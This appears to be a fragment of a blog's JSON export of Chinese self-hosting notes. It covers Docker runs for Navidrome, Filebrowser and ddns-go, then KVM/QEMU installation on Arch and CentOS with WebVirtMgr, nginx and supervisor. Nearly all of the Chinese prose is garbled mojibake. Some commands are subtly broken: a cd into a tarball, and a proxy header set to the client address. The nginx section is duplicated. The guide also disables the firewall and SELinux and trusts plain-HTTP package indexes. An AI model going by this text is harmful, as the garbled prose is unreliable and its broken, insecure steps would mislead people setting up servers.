unless-stopped environment: # Optional: put your config options customization here. Examples: ND_SCANSCHEDULE: 1h ND_LOGLEVEL: info ND_SESSIONTIMEOUT: 24h ND_BASEURL: &quot;&quot; volumes: - &quot;/home/fish/navidrome:/data&quot; - &quot;/home/fish/music:/music:ro&quot; 1docker-compose up -d 12345678910111213fish@fishserver:~$ sudo docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES36f1b4c09f21 deluan/navidrome:latest &quot;/app/navidrome&quot; 10 minutes ago Restarting (1) 34 seconds ago fish_navidrome_1fish@fishserver:~$ sudo docker rm 36f1b4c09f21Error response from daemon: You cannot remove a restarting container 36f1b4c09f21d86076b10c9d7f9659eeff2976c4199e4b3beab2f26112503b0c. Stop the container before attempting removal or force removefish@fishserver:~$ sudo docker rm -f 36f1b4c09f2136f1b4c09f21fish@fishserver:~$ ç¬¬äºŒç§æ–¹å¼123456789docker run -d \\ --name navidrome \\ --restart=unless-stopped \\ --user $(id -u):$(id -g) \\ -v /home/fish/music:/music:ro \\ -v /home/fish/navidrome:/data \\ -p 4533:4533 \\ -e ND_LOGLEVEL=info \\ deluan/navidrome:latest 12docker run -d -v /home/fish/music:/srv -v /home/fish/filebrowser/filebrowserconfig.json:/etc/config.json -v /home/fish/filebrowser/database.db:/etc/database.db -p 8080:80 filebrowser/filebrowser ddns-go1docker run -d --name ddns-go --restart=always --net=host -v /home/fish/ddns-go:/root jeessy/ddns-go Dockerä¸­ä½¿ç”¨(æ¥è‡ªå®˜æ–¹æ–‡æ¡£) ä¸æŒ‚è½½ä¸»æœºç›®å½•, åˆ é™¤å®¹å™¨åŒæ—¶ä¼šåˆ é™¤é…ç½® 1234# hostæ¨¡å¼, åŒæ—¶æ”¯æŒIPv4/IPv6, Liunxç³»ç»Ÿæ¨èdocker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go# æ¡¥æ¥æ¨¡å¼, åªæ”¯æŒIPv4, Mac/Windowsç³»ç»Ÿæ¨èdocker run -d --name ddns-go --restart=always -p 9876:9876 jeessy/ddns-go åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€http://ä¸»æœºIP:9876ï¼Œä¿®æ”¹ä½ çš„é…ç½®ï¼ŒæˆåŠŸ [å¯é€‰] æŒ‚è½½ä¸»æœºç›®å½•, åˆ é™¤å®¹å™¨åé…ç½®ä¸ä¼šä¸¢å¤±ã€‚å¯æ›¿æ¢ /opt/ddns-go ä¸ºä¸»æœºç›®å½•, é…ç½®æ–‡ä»¶ä¸ºéšè—æ–‡ä»¶ 1docker run -d --name ddns-go --restart=always --net=host -v /opt/ddns-go:/root jeessy/ddns-go [å¯é€‰] æ”¯æŒå¯åŠ¨å¸¦å‚æ•° -lç›‘å¬åœ°å€ -fé—´éš”æ—¶é—´(ç§’) 1docker run -d --name ddns-go --restart=always --net=host jeessy/ddns-go -l :9877","categories":[],"tags":[]},{"title":"kvmè™šæ‹Ÿæœºå®‰è£…wrt","slug":"kvmè™šæ‹Ÿæœºå®‰è£…wrt","date":"2024-01-08T08:29:59.000Z","updated":"2024-01-21T16:34:12.483Z","comments":true,"path":"2024/01/08/kvmè™šæ‹Ÿæœºå®‰è£…wrt/","link":"","permalink":"http://example.com/2024/01/08/kvm%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85wrt/","excerpt":"æœ€è¿‘åœ¨æŠ˜è…¾æœåŠ¡éƒ¨ç½²å…¬ç½‘çš„äº‹æƒ…1234567æœ¬æ¥æƒ³ç€360t7åˆ·æˆwrtä»¥ä¸ºèƒ½åœ¨çº¿æ¶®å®é™…ä¸Šæ˜¯è¦çƒ§å½•ä»–è‡ªå¸¦çš„é˜²ç«å¢™æŒ¡æˆ‘çš„æœåŠ¡å´æ²¡æœ‰å…³é—­çš„åœ°æ–¹ã€‚è¿™ä¸ªå°±å¾ˆéš¾å—å› ä¸ºä¸€æ—¶åŠä¼šæ²¡æœ‰åŠæ³•æ•´ä¸€å°æ‹¥æœ‰wrtçš„ç¡¬è·¯ç”±åˆå¬è™šæ‹Ÿæœºkvmå’Œvboxã€‚é€‰æ‹©kvmè™šæ‹Ÿæœºä¹‹å‰ç”¨dockerç»“æœå¤ºèˆå®¿ä¸»æœºï¼Œã€‚è¿™ä¸ªæˆ‘ä¸å¤ªäº†è§£dockersæŠ€æœ¯ç­‰ä»¥åä¼šç ”ç©¶ä¸€ä¸‹ä»–çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ï¼æœåŠ¡å™¨ç¯å¢ƒæ˜¯archã€‚kvmã€‚dockerï¼Œddnsï¼Œåå‘ä»£ç†è¿˜æœ‰httpsä»¥åä¼šè€ƒè™‘æï¼ æ¬è¿è‡ªï¼šarchlinux å®‰è£…KVM,QEMU - æ°æ–­æ›²åˆ«é’ˆ - åšå®¢å›­ (cnblogs.com) KVMæ˜¯Linuxä¸–ç•Œä¸­æœ€å¸¸ç”¨çš„è™šæ‹ŸåŒ–è½¯ä»¶ä¹‹ä¸€ã€‚äº‹å®ä¸Šï¼Œå¤§å¤šæ•°äº‘æä¾›å•†éƒ½ä½¿ç”¨KVMä½œä¸ºä»–ä»¬çš„è™šæ‹Ÿæœºç®¡ç†ç¨‹åºã€‚åŒ…æ‹¬OpenStackåœ¨å†…çš„å¤§å‹é¡¹ç›®éƒ½ä½¿ç”¨KVMä½œä¸ºé»˜è®¤è™šæ‹ŸåŒ–å·¥å…·ã€‚ ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨Arch Linuxå’ŒManjaroä¸Šå®‰è£…KVMã€QEMUå’ŒVirt Managerçš„å®Œæ•´æŒ‡å—ã€‚","text":"æœ€è¿‘åœ¨æŠ˜è…¾æœåŠ¡éƒ¨ç½²å…¬ç½‘çš„äº‹æƒ…1234567æœ¬æ¥æƒ³ç€360t7åˆ·æˆwrtä»¥ä¸ºèƒ½åœ¨çº¿æ¶®å®é™…ä¸Šæ˜¯è¦çƒ§å½•ä»–è‡ªå¸¦çš„é˜²ç«å¢™æŒ¡æˆ‘çš„æœåŠ¡å´æ²¡æœ‰å…³é—­çš„åœ°æ–¹ã€‚è¿™ä¸ªå°±å¾ˆéš¾å—å› ä¸ºä¸€æ—¶åŠä¼šæ²¡æœ‰åŠæ³•æ•´ä¸€å°æ‹¥æœ‰wrtçš„ç¡¬è·¯ç”±åˆå¬è™šæ‹Ÿæœºkvmå’Œvboxã€‚é€‰æ‹©kvmè™šæ‹Ÿæœºä¹‹å‰ç”¨dockerç»“æœå¤ºèˆå®¿ä¸»æœºï¼Œã€‚è¿™ä¸ªæˆ‘ä¸å¤ªäº†è§£dockersæŠ€æœ¯ç­‰ä»¥åä¼šç ”ç©¶ä¸€ä¸‹ä»–çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ï¼æœåŠ¡å™¨ç¯å¢ƒæ˜¯archã€‚kvmã€‚dockerï¼Œddnsï¼Œåå‘ä»£ç†è¿˜æœ‰httpsä»¥åä¼šè€ƒè™‘æï¼ æ¬è¿è‡ªï¼šarchlinux å®‰è£…KVM,QEMU - æ°æ–­æ›²åˆ«é’ˆ - åšå®¢å›­ (cnblogs.com) KVMæ˜¯Linuxä¸–ç•Œä¸­æœ€å¸¸ç”¨çš„è™šæ‹ŸåŒ–è½¯ä»¶ä¹‹ä¸€ã€‚äº‹å®ä¸Šï¼Œå¤§å¤šæ•°äº‘æä¾›å•†éƒ½ä½¿ç”¨KVMä½œä¸ºä»–ä»¬çš„è™šæ‹Ÿæœºç®¡ç†ç¨‹åºã€‚åŒ…æ‹¬OpenStackåœ¨å†…çš„å¤§å‹é¡¹ç›®éƒ½ä½¿ç”¨KVMä½œä¸ºé»˜è®¤è™šæ‹ŸåŒ–å·¥å…·ã€‚ ä»¥ä¸‹æ˜¯å¦‚ä½•åœ¨Arch Linuxå’ŒManjaroä¸Šå®‰è£…KVMã€QEMUå’ŒVirt Managerçš„å®Œæ•´æŒ‡å—ã€‚ å®‰è£…KVMåŒ…ç¬¬ä¸€æ­¥æ˜¯å®‰è£…è¿è¡ŒKVMæ‰€éœ€çš„æ‰€æœ‰è½¯ä»¶åŒ…ï¼š 123sudo pacman -Syysudo pacman -S archlinux-keyringsudo pacman -S qemu virt-manager virt-viewer dnsmasq vde2 bridge-utils openbsd-netcat dmidecode åŒæ—¶å®‰è£…ebtbleså’Œiptablesè½¯ä»¶åŒ…ã€‚ 1sudo pacman -S ebtables iptables å®‰è£…å…¶ä»–å·¥å…·libguestfsæ˜¯ä¸€ç»„ç”¨äºè®¿é—®å’Œä¿®æ”¹è™šæ‹Ÿæœºï¼ˆVMï¼‰ç£ç›˜æ˜ åƒçš„å·¥å…·ã€‚ä½œç”¨å¦‚ä¸‹ï¼š æŸ¥çœ‹å’Œç¼–è¾‘æ¥å®¾ä¸­çš„æ–‡ä»¶ ç¼–å†™å¯¹è™šæ‹Ÿæœºçš„æ›´æ”¹è„šæœ¬ ç›‘è§†ç£ç›˜ä½¿ç”¨&#x2F;å¯ç”¨ç»Ÿè®¡ä¿¡æ¯ åˆ›å»ºæ¥å®¾ P2V ï¼ˆç‰©ç†æœºåˆ°è™šæ‹Ÿæœºçš„è¿ç§»ï¼‰ V2V ï¼ˆè™šæ‹Ÿæœºåˆ°è™šæ‹Ÿæœºçš„è¿ç§»ï¼‰ æ‰§è¡Œå¤‡ä»½åŠå…¶ä»– 1sudo pacman -S libguestfs å¯åŠ¨KVM libvirtæœåŠ¡ å¯ç”¨æœåŠ¡å¹¶è®¾ç½®å¼€æœºè‡ªå¯åŠ¨ 12sudo systemctl enable libvirtd.servicesudo systemctl start libvirtd.service æŸ¥çœ‹è¿è¡ŒçŠ¶æ€ 1systemctl status libvirtd.service é…ç½®æ™®é€šç”¨æˆ·å¯ä»¥ä½¿ç”¨KVM æ‰“å¼€&#x2F;etc&#x2F;libvirt&#x2F;libvirtd.confæ–‡ä»¶è¿›è¡Œç¼–è¾‘ã€‚ 12sudo pacman -S vimsudo vim /etc/libvirt/libvirtd.conf å°†UNIXåŸŸå¥—æ¥å­—ç»„æ‰€æœ‰æƒè®¾ç½®ä¸ºlibvirtï¼ˆç¬¬85è¡Œå·¦å³ï¼‰ 1unix_sock_group = &quot;libvirt&quot; ä¸ºR&#x2F;Wå¥—æ¥å­—è®¾ç½®UNIXå¥—æ¥å­—æƒé™ï¼ˆç¬¬102è¡Œé™„è¿‘ï¼‰ 1unix_sock_rw_perms = &quot;0770&quot; å°†å½“å‰ç”¨æˆ·å¸æˆ·æ·»åŠ åˆ°libvirtç»„ 12sudo usermod -a -G libvirt $(whoami)newgrp libvirt é‡æ–°å¯åŠ¨libvirtå®ˆæŠ¤è¿›ç¨‹ã€‚ 1sudo systemctl restart libvirtd.service å¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–ï¼ˆå¯é€‰ï¼‰ åµŒå¥—è™šæ‹ŸåŒ–å°±æ˜¯åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œè™šæ‹Ÿæœºã€‚å¦‚å›¾æ‰€ç¤ºï¼Œé€šè¿‡å¯ç”¨å†…æ ¸æ¨¡å—ä¸ºkvm_intel &#x2F; kvm_amdå¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–ã€‚ ä¸€èˆ¬ä¸ä¼šè¿™æ ·æã€‚ 1234567### Intel Processor ###sudo modprobe -r kvm_intelsudo modprobe kvm_intel nested=1### AMD Processor ###sudo modprobe -r kvm_amdsudo modprobe kvm_amd nested=1 è¦ä½¿æ­¤é…ç½®æŒä¹…åŒ–ï¼Œè¯·è¿è¡Œï¼š 1echo &quot;options kvm-intel nested=1&quot; | sudo tee /etc/modprobe.d/kvm-intel.conf ç¡®è®¤â€œåµŒå¥—è™šæ‹ŸåŒ–â€è®¾ç½®ä¸ºâ€œyesâ€ï¼š 12345678910111213## Intel Processor ###$ systool -m kvm_intel -v | grep nested nested = &quot;Y&quot; nested_early_check = &quot;N&quot;$ cat /sys/module/kvm_intel/parameters/nested Y### AMD Processor ###$ systool -m kvm_amd -v | grep nested nested = &quot;Y&quot; nested_early_check = &quot;N&quot;$ cat /sys/module/kvm_amd/parameters/nested Y kvmä»‹ç»è½¬è½½ï¼šKVMçš„åŸºæœ¬ä½¿ç”¨ - åŒ¿åè€…nwnu - åšå®¢å›­ (cnblogs.com) è™šæ‹ŸåŒ–æ˜¯äº‘è®¡ç®—çš„åŸºç¡€ã€‚ç®€å•çš„è¯´ï¼Œè™šæ‹ŸåŒ–ä½¿å¾—åœ¨ä¸€å°ç‰©ç†çš„æœåŠ¡å™¨ä¸Šå¯ä»¥è·‘å¤šå°è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºå…±äº«ç‰©ç†æœºçš„ CPUã€å†…å­˜ã€IO ç¡¬ä»¶èµ„æºï¼Œä½†é€»è¾‘ä¸Šè™šæ‹Ÿæœºä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚ ç‰©ç†æœºæˆ‘ä»¬ä¸€èˆ¬ç§°ä¸ºå®¿ä¸»æœºï¼ˆHostï¼‰ï¼Œå®¿ä¸»æœºä¸Šé¢çš„è™šæ‹Ÿæœºç§°ä¸ºå®¢æˆ·æœºï¼ˆGuestï¼‰ã€‚ é‚£ä¹ˆ Host æ˜¯å¦‚ä½•å°†è‡ªå·±çš„ç¡¬ä»¶èµ„æºè™šæ‹ŸåŒ–ï¼Œå¹¶æä¾›ç»™ Guest ä½¿ç”¨çš„å‘¢ï¼Ÿ è¿™ä¸ªä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªå«åš Hypervisor çš„ç¨‹åºå®ç°çš„ã€‚ æ ¹æ® Hypervisor çš„å®ç°æ–¹å¼å’Œæ‰€å¤„çš„ä½ç½®ï¼Œè™šæ‹ŸåŒ–åˆåˆ†ä¸ºä¸¤ç§ï¼š å…¨è™šæ‹ŸåŒ–- åŠè™šæ‹ŸåŒ–å…¨è™šæ‹ŸåŒ–ï¼š Hypervisor ç›´æ¥å®‰è£…åœ¨ç‰©ç†æœºä¸Šï¼Œå¤šä¸ªè™šæ‹Ÿæœºåœ¨ Hypervisor ä¸Šè¿è¡Œã€‚Hypervisor å®ç°æ–¹å¼ä¸€èˆ¬æ˜¯ä¸€ä¸ªç‰¹æ®Šå®šåˆ¶çš„ Linux ç³»ç»Ÿã€‚Xen å’Œ VMWare çš„ ESXi éƒ½å±äºè¿™ä¸ªç±»å‹ åŠè™šæ‹ŸåŒ–ï¼š ç†è®ºä¸Šè®²ï¼š å…¨è™šæ‹ŸåŒ–ä¸€èˆ¬å¯¹ç¡¬ä»¶è™šæ‹ŸåŒ–åŠŸèƒ½è¿›è¡Œäº†ç‰¹åˆ«ä¼˜åŒ–ï¼Œæ€§èƒ½ä¸Šæ¯”åŠè™šæ‹ŸåŒ–è¦é«˜ï¼› åŠè™šæ‹ŸåŒ–å› ä¸ºåŸºäºæ™®é€šçš„æ“ä½œç³»ç»Ÿï¼Œä¼šæ¯”è¾ƒçµæ´»ï¼Œæ¯”å¦‚æ”¯æŒè™šæ‹ŸæœºåµŒå¥—ã€‚åµŒå¥—æ„å‘³ç€å¯ä»¥åœ¨KVMè™šæ‹Ÿæœºä¸­å†è¿è¡ŒKVMã€‚ *2*|***0***2. kvmä»‹ç» kVM å…¨ç§°æ˜¯ Kernel-Based Virtual Machineã€‚ä¹Ÿå°±æ˜¯è¯´ KVM æ˜¯åŸºäº Linux å†…æ ¸å®ç°çš„ã€‚ KVMæœ‰ä¸€ä¸ªå†…æ ¸æ¨¡å—å« kvm.koï¼Œåªç”¨äºç®¡ç†è™šæ‹Ÿ CPU å’Œå†…å­˜ã€‚ é‚£ IO çš„è™šæ‹ŸåŒ–ï¼Œæ¯”å¦‚å­˜å‚¨å’Œç½‘ç»œè®¾å¤‡åˆ™æ˜¯ç”± Linux å†…æ ¸ä¸Qemuæ¥å®ç°ã€‚ ä½œä¸ºä¸€ä¸ª Hypervisorï¼ŒKVM æœ¬èº«åªå…³æ³¨è™šæ‹Ÿæœºè°ƒåº¦å’Œå†…å­˜ç®¡ç†è¿™ä¸¤ä¸ªæ–¹é¢ã€‚IO å¤–è®¾çš„ä»»åŠ¡äº¤ç»™ Linux å†…æ ¸å’Œ Qemuã€‚ å¤§å®¶åœ¨ç½‘ä¸Šçœ‹ KVM ç›¸å…³æ–‡ç« çš„æ—¶å€™è‚¯å®šç»å¸¸ä¼šçœ‹åˆ° Libvirt è¿™ä¸ªä¸œè¥¿ã€‚ Libvirt å°±æ˜¯ KVM çš„ç®¡ç†å·¥å…·ã€‚ å…¶å®ï¼ŒLibvirt é™¤äº†èƒ½ç®¡ç† KVM è¿™ç§ Hypervisorï¼Œè¿˜èƒ½ç®¡ç† Xenï¼ŒVirtualBox ç­‰ã€‚ Libvirt åŒ…å« 3 ä¸ªä¸œè¥¿ï¼šåå° daemon ç¨‹åº libvirtdã€API åº“å’Œå‘½ä»¤è¡Œå·¥å…· virsh libvirtdæ˜¯æœåŠ¡ç¨‹åºï¼Œæ¥æ”¶å’Œå¤„ç† API è¯·æ±‚ï¼› API åº“ä½¿å¾—å…¶ä»–äººå¯ä»¥å¼€å‘åŸºäº Libvirt çš„é«˜çº§å·¥å…·ï¼Œæ¯”å¦‚ virt-managerï¼Œè¿™æ˜¯ä¸ªå›¾å½¢åŒ–çš„ KVM ç®¡ç†å·¥å…·ï¼› virsh æ˜¯æˆ‘ä»¬ç»å¸¸è¦ç”¨çš„ KVM å‘½ä»¤è¡Œå·¥å…· *3*|***0***3. kvméƒ¨ç½² ç¯å¢ƒè¯´æ˜ï¼š IPï¼š192.168.157.99 *3*|***1***3.1 kvmå®‰è£… éƒ¨ç½²å‰è¯·ç¡®ä¿ä½ çš„CPUè™šæ‹ŸåŒ–åŠŸèƒ½å·²å¼€å¯ã€‚åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š è™šæ‹Ÿæœºè¦å…³æœºè®¾ç½®CPUè™šæ‹ŸåŒ–- ç‰©ç†æœºè¦åœ¨BIOSé‡Œå¼€å¯CPUè™šæ‹ŸåŒ–&#x2F;&#x2F;å…³é—­é˜²ç«å¢™ä¸selinux 12345systemctl stop firewalldsystemctl disable firewalldsetenforce 0sed -ri &#x27;s/^(SELINUX=).*/\\1disabled/g&#x27; /etc/selinux/config//è¿™ä¸€æ­¥ååˆ†é‡è¦ï¼ï¼ï¼ &#x2F;&#x2F;é…ç½®ç½‘ç»œæº 1234curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repowget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repoyum makecacheyum -y install epel-release vim wget net-tools unzip zip gcc gcc-c++ &#x2F;&#x2F;éªŒè¯CPUæ˜¯å¦æ”¯æŒKVMï¼›å¦‚æœç»“æœä¸­æœ‰vmxï¼ˆIntelï¼‰æˆ–svm(AMD)å­—æ ·ï¼Œå°±è¯´æ˜CPUçš„æ”¯æŒçš„ 1egrep -o &#x27;vmx|svm&#x27; /proc/cpuinfo &#x2F;&#x2F;å®‰è£…KVMä¾èµ–åŒ…åŠç®¡ç†å·¥å…· 12# kvmå±äºå†…æ ¸æ€ï¼Œä¸éœ€è¦å®‰è£…ã€‚ä½†æ˜¯éœ€è¦ä¸€äº›ç®¡ç†å·¥å…·åŒ…yum install -y qemu-kvm libvirt libvirt-python libguestfs-tools virt-install virt-manager python-virtinst libvirt-client virt-viewer qemu-kvm-tool &#x2F;&#x2F;å› ä¸ºè™šæ‹Ÿæœºä¸­ç½‘ç»œï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å’Œå…¬å¸çš„å…¶ä»–æœåŠ¡å™¨æ˜¯åŒä¸€ä¸ªç½‘æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠ KVMæœåŠ¡å™¨çš„ç½‘å¡é…ç½®æˆæ¡¥æ¥æ¨¡å¼ã€‚è¿™æ ·çš„è¯KVMçš„è™šæ‹Ÿæœºå°±å¯ä»¥é€šè¿‡è¯¥æ¡¥æ¥ç½‘å¡å’Œå…¬å¸å†…éƒ¨ å…¶ä»–æœåŠ¡å™¨å¤„äºåŒä¸€ç½‘æ®µ &#x2F;&#x2F;æ­¤å¤„æˆ‘çš„ç½‘å¡æ˜¯ens32ï¼Œæ‰€ä»¥ç”¨br0æ¥æ¡¥æ¥ens32ç½‘å¡ 1234567891011121314151617181920212223//å¯¹åº”ä¿®æ”¹æˆ–è€…æ·»åŠ ä»¥ä¸‹å†…å®¹å³å¯[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-br0 TYPE=BridgeDEVICE=br0NM_CONTROLLED=noBOOTPROTO=staticNAME=br0ONBOOT=yesIPADDR=192.168.157.99NETMASK=255.255.255.0GATEWAY=192.168.157.2DNS1=8.8.8.8//ä¿ç•™ä»¥ä¸‹å†…å®¹å³å¯[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32 TYPE=EthernetBOOTPROTO=staticNAME=ens33DEVICE=ens33ONBOOT=yesBRIDGE=br0NM_CONTROLLED=no[root@mp ~]# systemctl restart network &#x2F;&#x2F;å¯åŠ¨æœåŠ¡ 12systemctl start libvirtdsystemctl enable libvirtd &#x2F;&#x2F;éªŒè¯å®‰è£…ç»“æœ 1234[root@mp ~]# lsmod|grep kvmkvm_intel 170086 0 kvm 566340 1 kvm_intelirqbypass 13503 1 kvm &#x2F;&#x2F;æµ‹è¯•å¹¶éªŒè¯å®‰è£…ç»“æœ 123456789101112131415[root@mp ~]# virsh -c qemu:///system list Id åç§° çŠ¶æ€----------------------------------------------------[root@mp ~]# virsh --version4.5.0[root@mp ~]# virt-install --version1.5.0[root@mp ~]# ln -s /usr/libexec/qemu-kvm /usr/bin/qemu-kvm[root@mp ~]# ll /usr/bin/qemu-kvm lrwxrwxrwx. 1 root root 21 3æœˆ 14 14:17 /usr/bin/qemu-kvm -&amp; /usr/libexec/qemu-kvm [root@mp ~]# lsmod |grep kvmkvm_intel 170086 0 kvm 566340 1 kvm_intelirqbypass 13503 1 kvm &#x2F;&#x2F;æŸ¥çœ‹ç½‘æ¡¥ä¿¡æ¯ 1234[root@mp ~]# brctl showbridge name bridge id STP enabled interfacesbr0 8000.000c2993a66c no ens32virbr0 8000.5254009df26a yes virbr0-nic *3*|***2***3.2 kvm webç®¡ç†ç•Œé¢å®‰è£… kvm çš„ web ç®¡ç†ç•Œé¢æ˜¯ç”± webvirtmgr ç¨‹åºæä¾›çš„ã€‚ &#x2F;&#x2F;å®‰è£…ä¾èµ–åŒ… 1234# ç®¡ç†ç«¯å®‰è£…yum -y install git python-pip libvirt-python libxml2-python python-websockify supervisor gcc python-devel# ä½¿ç”¨pipå®‰è£…Pythonæ‰©å±•ç¨‹åºåº“pip install numpy -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com &#x2F;&#x2F;å‡çº§pip 1pip install --upgrade pip &#x2F;&#x2F;gitå…‹éš†é…ç½®å¹¶è¿è¡ŒWebVirMgr 1234567891011121314151617181920212223# åˆ›å»ºdataç›®å½•ï¼Œå°†WebVirtMgrç§»åŠ¨åˆ°dataç›®å½•ï¼ŒåŒæ—¶åˆ›å»ºKVMå­˜å‚¨ç›®å½•mkdir /data/kvm -pv# å…‹éš†é¡¹ç›®cd /datagit clone git://github.com/retspen/webvirtmgr.gitcd webvirtmgrpip install -r requirements.txt -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com# è¯´æ˜:requirements.txtä¸»è¦æ˜¯ç”¨äºè®°å½•æ‰€æœ‰ä¾èµ–åŒ…åŠå…¶ç²¾ç¡®çš„ç‰ˆæœ¬å·ã€‚ä»¥ä¾¿æ–°ç¯å¢ƒéƒ¨ç½²# åˆå§‹åŒ–ç¯å¢ƒ./manage.py syncdb## è¿™é‡Œéœ€è¦æˆ‘ä»¬è¾“å…¥Yesï¼Œé…ç½®ç®¡ç†å‘˜ç”¨æˆ·é…ç½®ä¿¡æ¯å¦‚ä¸‹Would you like to create one now? (yes/no): yes #æ˜¯å¦ç°åœ¨åˆ›å»ºç®¡ç†å‘˜ç”¨æˆ·Username (leave blank to use &#x27;root&#x27;): root #ç”¨æˆ·åç§°Email address: #é‚®ç®±åœ°å€ (å¯ä»¥ä¸å¡«)Password: #ç®¡ç†å‘˜ç”¨æˆ·å¯†ç Password (again): #é‡å¤è¾“å…¥å¯†ç Superuser created successfully. #åˆ›å»ºæˆåŠŸ# é…ç½®Django é™æ€é¡µé¢./manage.py collectstatic è¾“å…¥Yeså³å¯# å¦‚æœè¿˜æƒ³ç»§ç»­æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤./manage.py createsuperuser &#x2F;&#x2F;å¯åŠ¨WebVirMgr 12å‰å°å¯åŠ¨WebVirMgrï¼Œé»˜è®¤æ˜¯Debugæ¨¡å¼åŒæ—¶æ—¥å¿—æ‰“å°åœ¨å‰å°./manage.py runserver 0:8000 è®¿é—®:http://192.168.209.134:8000 &#x2F;&#x2F;å®‰è£…Nginx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748491.å®‰è£…ä¾èµ–yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel2.å®‰è£…ç¼–è¯‘Nginxcd /root/wget http://nginx.org/download/nginx-1.16.1.tar.gzuseradd -s /sbin/nologin nginx -M tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_modulemake &amp;&amp; make installln -s /usr/local/nginx-1.16.1 /usr/local/nginx# ä¿®æ”¹é…ç½®æ–‡ä»¶cd /usr/local/nginx/confvim nginx.confworker_processes 1;user nginx;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name kvm.i4t.com; location / &#123; proxy_pass http://127.0.0.1:8000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Proto $remote_addr; proxy_connect_timeout 600; proxy_read_timeout 600; proxy_send_timeout 600; client_max_body_size 5120M; &#125; location /static/ &#123; root /data/webvirtmgr; expires max; &#125; &#125;&#125;# å¯åŠ¨Nginx/usr/local/nginx/sbin/nginx -t/usr/local/nginx/sbin/nginx &#x2F;&#x2F;é…ç½®nginx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748491.å®‰è£…ä¾èµ–yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel2.å®‰è£…ç¼–è¯‘Nginxcd /root/wget http://nginx.org/download/nginx-1.16.1.tar.gzuseradd -s /sbin/nologin nginx -M tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_modulemake &amp;&amp; make installln -s /usr/local/nginx-1.16.1 /usr/local/nginx# ä¿®æ”¹é…ç½®æ–‡ä»¶cd /usr/local/nginx/confvim nginx.confworker_processes 1;user nginx;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server &#123; listen 80; server_name kvm.i4t.com; location / &#123; proxy_pass http://127.0.0.1:8000; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Proto $remote_addr; proxy_connect_timeout 600; proxy_read_timeout 600; proxy_send_timeout 600; client_max_body_size 5120M; &#125; location /static/ &#123; root /data/webvirtmgr; expires max; &#125; &#125;&#125;# å¯åŠ¨Nginx/usr/local/nginx/sbin/nginx -t/usr/local/nginx/sbin/nginx &#x2F;&#x2F;åˆ›å»ºsupervisoré…ç½®æ–‡ä»¶ 12345678910111213141516171819202122232425262728WebVirtMgré»˜è®¤ä½¿ç”¨supervisorè¿›è¡Œç®¡ç†(å¯åŠ¨åœæ­¢æœåŠ¡)cat &gt; /etc/supervisord.d/webvirtmgr.ini &lt;&lt; EOF[program:webvirtmgr]command=/usr/bin/python /data/webvirtmgr/manage.py run_gunicorn -c /data/webvirtmgr/conf/gunicorn.conf.pydirectory=/data/webvirtmgrautostart=trueautorestart=truelogfile=/var/log/supervisor/webvirtmgr.loglog_stderr=trueuser=root[program:webvirtmgr-console]command=/usr/bin/python /data/webvirtmgr/console/webvirtmgr-consoledirectory=/data/webvirtmgrautostart=trueautorestart=truestdout_logfile=/var/log/supervisor/webvirtmgr-console.logredirect_stderr=trueuser=rootEOF# å¯åŠ¨systemctl start supervisord systemctl enable supervisord# æ£€æŸ¥supervisorctl status# é‡å¯æ‰€ä»¥ï¼ˆéæ‰§è¡Œï¼‰supervisorctl restart all &#x2F;&#x2F;é‡å¯nginx 1/usr/local/nginx/sbin/nginx -s reload *4*|***0***4. kvm webç•Œé¢ç®¡ç† é€šè¿‡ipåœ°å€åœ¨æµè§ˆå™¨ä¸Šè®¿é—®kvmï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œå°±æ˜¯ï¼š æ­¤å¤„çš„ç”¨æˆ·ä¸ºï¼šroot å¯†ç ä¸ºï¼šæ‰§è¡Œpython manage syncdbæ—¶è®¾ç½®çš„è¶…çº§ç®¡ç†å‘˜å¯†ç  æ­¤å¤„çš„Labelè¦ä¸ä¸‹é¢çš„FQDN &#x2F; IPä¸€è‡´ï¼ 